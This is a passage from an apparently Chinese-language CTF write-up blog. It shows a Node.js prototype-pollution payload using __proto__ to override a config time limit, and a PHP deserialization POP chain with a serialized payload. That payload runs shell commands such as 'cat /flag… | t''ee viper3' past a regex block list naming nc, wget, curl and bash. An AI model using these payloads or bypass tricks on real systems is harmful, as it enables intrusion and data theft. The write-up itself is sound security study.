class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<span class="hljs-comment">//getInfoå¼‚æ­¥å‡½æ•°</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<span class="hljs-comment">//æ£€æŸ¥ä¼ å…¥çš„timestampå‚æ•°æ˜¯å¦ä¸ºæ•°å­—ç±»å‹ï¼Œå¦‚æœä¸æ˜¯åˆ™å°†å…¶è®¾ç½®ä¸ºå½“å‰æ—¶é—´æˆ³</span><br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<span class="hljs-comment">//å°†min_public_timeè½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œä½¿ç”¨åº”ç”¨ç¨‹åºé…ç½®ä¸­çš„æœ€å°å…¬å¼€æ—¶é—´ï¼Œå¦‚æœæ²¡æœ‰é…ç½®ï¼Œåˆ™ä½¿ç”¨é»˜è®¤é…ç½®ä¸­çš„æœ€å°å…¬å¼€æ—¶é—´</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<span class="hljs-comment">//ç¡®ä¿timestampä¸ä¼šæ—©äºminTimestamp</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-keyword">async</span> (ctx) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>) ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//ä¸»è¦å°±æ˜¯getInfoè¿™ä¸ªå‡½æ•°ï¼Œå‰©ä¸‹çš„å°±æ˜¯ä¸€äº›è¿”å›çŠ¶æ€å•¥çš„</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„æ³¨é‡Šï¼š<code>Remove test data from before the movie was released</code>ï¼Œåˆ é™¤ç”µå½±å‘å¸ƒä¹‹å‰çš„æµ‹è¯•æ•°æ®ã€‚é‚£<code>flag</code>åº”è¯¥å’Œç”µå½±å‘å¸ƒæ—¥æœŸä¹‹å‰çš„æŸäº›æ•°æ®æœ‰å…³ã€‚</p><p><code>submit.js</code>(å­˜åœ¨<code>merge</code>å‡½æ•°çš„éƒ¨åˆ†):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123;<br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><span class="hljs-comment">//ä»¥åŠï¼š</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼</span><br></code></pre></td></tr></table></figure><p>å…¶å®å¯¹åŸå‹é“¾æ±¡æŸ“è¿™ä¸œè¥¿æœ‰ç‚¹äº†è§£å°±ä¼šçŸ¥é“ï¼šå¯ä»¥é€šè¿‡<strong>å¯¹è±¡merge</strong>æˆ– <strong>å¯¹è±¡clone</strong>æ§åˆ¶<code>å¯¹è±¡.__proto__</code>çš„å€¼ï¼Œé—´æ¥ä¿®æ”¹ç»§æ‰¿è¯¥åŸå‹å¯¹è±¡çš„æ‰€æœ‰å¯¹è±¡ï¼Œä¸¾ä¸ªç®€å•çš„æ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ç”¨äºå°†ä¸€ä¸ªæºå¯¹è±¡çš„å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//éå†sourceçš„æ‰€æœ‰å±æ€§</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//å¯¹äºæ¯ä¸ªå±æ€§ï¼Œè‹¥åŒæ—¶å­˜åœ¨äºæºå¯¹è±¡å’Œç›®æ ‡å¯¹è±¡ä¸­</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåµŒå¥—å¯¹è±¡ï¼Œéœ€è¦é€’å½’è°ƒç”¨mergeå‡½æ•°ï¼Œå°†æºå¯¹è±¡çš„åµŒå¥—å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡çš„å¯¹åº”åµŒå¥—å±æ€§ä¸­ã€‚</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//éåµŒå¥—å±æ€§ï¼Œç›´æ¥å°†æºå¯¹è±¡çš„å±æ€§å€¼èµ‹ç»™ç›®æ ‡å¯¹è±¡çš„å¯¹åº”å±æ€§ã€‚</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parseçš„å­˜åœ¨å¯ä»¥å°†JSONå­—ç¬¦ä¸²è§£æä¸ºJavaScriptå¯¹è±¡ï¼Œè¿™æ ·ä¸€æ¥å°±å­˜åœ¨o2.__protp__.b=2,å¹¶æŠŠè¿™ä¸œè¥¿èµ‹å€¼ç»™ä¹‹å‰ä¸å­˜åœ¨çš„o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éšä¾¿æ·»ç‚¹æ•°æ®ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼š</p><p><code>submit</code>è¿™ä¸œè¥¿å°±æ˜¯æäº¤æ•°æ®ï¼Œ<code>info/æ—¶é—´æˆ³</code>å°±æ˜¯åŠ è½½åº•ä¸‹é‚£äº›æ„¿æœ›æ ‡ç­¾(çœ‹<code>info.js</code>ä¹Ÿèƒ½çŸ¥é“)</p><p><img src="/img/otengirl3.png" alt="otengirl3"></p><p><img src="/img/otengirl6.png" alt="otengirl6"></p><p>ç°åœ¨æœ‰ç‚¹æ€è·¯äº†ï¼šæ ¹æ®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br><br>timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“è¿™ä¸ª<code>timestamp</code>ä¼šå–<code>timestamp, minTimestamp</code>ä¹‹é—´çš„æœ€å¤§å€¼(ä¿è¯æ—¶é—´æ˜¯åœ¨ç”µå½±å‘å¸ƒä¹‹å)ï¼Œ<code>minTimestamp</code>çš„è¯é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„Dateå¯¹è±¡ã€‚å®ƒé¦–å…ˆå°è¯•ä»<code>CONFIG.min_public_time</code>ä¸­è·å–æœ€å°å…¬å…±æ—¶é—´ï¼Œå¦‚æœ<code>CONFIG.min_public_time</code>ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨<code>DEFAULT_CONFIG.min_public_time</code>çš„å€¼ã€‚</p><p>æˆ‘ä»¬å»é…ç½®æ–‡ä»¶ä¸­æ‰¾æ‰¾è¿™ä¸ªæ—¶é—´æ˜¯å¤šå°‘ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br><span class="hljs-comment">//config.default.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>config.js</code>ä¸­å¹¶ä¸å­˜åœ¨<code>min_public_time</code>(ä½†<code>config.default.js</code>ä¸­å­˜åœ¨ï¼Œæ‰€ä»¥åé¢å–å¾—å€¼æ˜¯<code>config.default.js</code>ä¸­çš„ã€‚)é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“<code>config.js</code>ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­åŠ å…¥æˆ‘ä»¬æƒ³è¦çš„<code>min_public_time</code>ï¼Œç„¶åç³»ç»Ÿå°±ä¼šå¿½ç•¥<code>config.default.js</code>ï¼Œè®©æ—¶é—´è¶³å¤Ÿæ—©ã€‚</p><p>é‚£ä¹ˆå“ªé‡Œè°ƒç”¨äº†<code>merge</code>å‡½æ•°å‘¢ï¼Ÿ<code>const result = await insert2db(merge(DEFAULT, data));</code></p><p>ç®€å•è¯´ä¸‹æ±¡æŸ“åŸç†ï¼š<code>merge(DEFAULT, data)</code>ä¼šæ£€æŸ¥<code>DEFAULT, data</code>é‡Œé¢çš„é”®ï¼Œå¦‚æœæŸä¸ªé”®ä»–ä¿©éƒ½æœ‰ï¼Œé‚£å°±é€’å½’è°ƒç”¨<code>merge</code>å‡½æ•°ã€‚å¦‚æœå­˜åœ¨æŸä¸ªé”®ä»–ä¿©ä¸åŒæ—¶æ‹¥æœ‰ï¼Œå°±ä»¤<code>DEFAULT[key] = data[key]</code>ã€‚</p><p>å¦‚æœ<code>data</code>å¯¹è±¡çš„åŸå‹é“¾ä¸Šå­˜åœ¨åä¸º<code>min_public_time</code>çš„å±æ€§ï¼Œåˆ™è¯¥å±æ€§å°†è¢«èµ‹å€¼ç»™<code>DEFAULT</code>å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>DEFAULT[key]</code>å°†ä¼šæŒ‡å‘åŸå‹é“¾ä¸Šçš„å€¼ã€‚åœ¨JavaScriptä¸­ï¼Œå¯¹è±¡å¯ä»¥å…·æœ‰ç‰¹æ®Šçš„å±æ€§__proto__ï¼Œå®ƒæŒ‡å‘å¯¹è±¡çš„åŸå‹ã€‚é€šè¿‡ä¿®æ”¹<code>data[&#39;__proto__&#39;</code>][â€˜min_public_timeâ€™]çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å½±å“åŸå‹é“¾ä¸Šçš„å±æ€§:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">payload<span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;place&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;contact&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1700797610124</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1970-01-01&quot;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/otengirl7.png" alt="otengirl7"></p><p>ç„¶ååˆ·æ–°ä¸€ä¸‹ï¼Œä¼šæŠ“åˆ°<code>info</code>çš„åŒ…ï¼š</p><p><img src="/img/otengirl8.png" alt="otengirl8"></p><p>æ ¹æ®å‰é¢çš„ä»£ç æˆ‘ä»¬çŸ¥é“<code>info</code>åé¢è·Ÿçš„æ•°å­—å°±æ˜¯<code>ts</code>ï¼Œå°±æ˜¯é‚£ä¸ª<code>min_time</code>åå†è¿‡å¤šå°‘ç§’(è¿˜æ˜¯æ¯«ç§’æ¥ç€ï¼Œå¿˜äº†)ã€‚åˆšè®¾ç½®äº†<code>1970-01-01</code>ï¼Œåé¢éšä¾¿æ”¹ä¸ªå°ç‚¹çš„æ•°å­—å°±è¡Œ:</p><p><img src="/img/otengirl9.png" alt="otengirl9"></p><p>æ‹¿åˆ°<code>flag</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>minipop</code>ç±»ä¸‹å­˜åœ¨ä¸¤ä¸ªå…¬æœ‰å±æ€§<code>$code</code>å’Œ<code>qwejaskdjnlka</code>ä»¥åŠ<code> __toString()</code>æ–¹æ³•å’Œ<code>__destruct()</code>ï¼Œ<code>__destruct()</code>è¿™ä¸œè¥¿å¯¹è±¡é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(åºåˆ—åŒ–ä¼šè°ƒç”¨ååºåˆ—åŒ–ä¹Ÿä¼šè°ƒç”¨)ã€‚<code>__toString()</code>è¿™ä¸œè¥¿å°±æ˜¯ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶ä¼šè¢«è°ƒç”¨ã€‚</p><p>æ€è·¯å°±æ˜¯é€šè¿‡<code>__destruct()</code>è°ƒç”¨<code>__toString()</code>ã€‚</p><p>è¿˜æœ‰å°±æ˜¯è™½ç„¶<code>waf</code>è¿‡æ»¤äº†æŒºå¤šï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨æ‹¼æ¥çš„ç‰¹æ€§<code>æ¯”å¦‚è¿‡æ»¤äº†lså¯ä»¥åˆ©ç”¨l&#39;&#39;sæ¥ä»£æ›¿</code></p><p><code>exec</code>å‡½æ•°æœ¬èº«ä¸ä¼šå°†å‘½ä»¤çš„ç»“æœç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚å®ƒå°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚<code>eval</code>ä¼šæ›´å¸¸è§</p><p>è¿™é¢˜ä¸ä¼šåšã€‚ã€‚å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<code>https://blog.csdn.net/m0_63138919/article/details/133958661</code></p><p>ä¸»è¦å°±æ˜¯åˆ©ç”¨<code>tee</code>è¿™ä¸ªå‘½ä»¤ï¼š</p><p><img src="/img/tee3.png" alt="tee3"></p><p>åç¼€åŠ ä¸åŠ æ— æ‰€è°“ï¼Œ<code>Linux</code>ä¸‹æ–‡ä»¶åå¯ä»¥ä½¿ä»»ä½•æœ‰æ•ˆçš„å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//é€šè¿‡echoï¼Œè¿™æ—¶$bè¿™ä¸ªç±»çš„å®ä¾‹è¢«å½“æˆå­—ç¬¦ä¸²äº†</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;ls / | t&#x27;&#x27;ee viper&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>å›æ˜¾<code>alright</code>åç›´æ¥è®¿é—®<code>viper</code>å°±è¡Œï¼š</p><p><img src="/img/tee1.png" alt="tee1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//é€šè¿‡echoï¼Œè¿™æ—¶$bè¿™ä¸ªç±»çš„å®ä¾‹è¢«å½“æˆå­—ç¬¦ä¸²äº†</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:35:&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tee2.png" 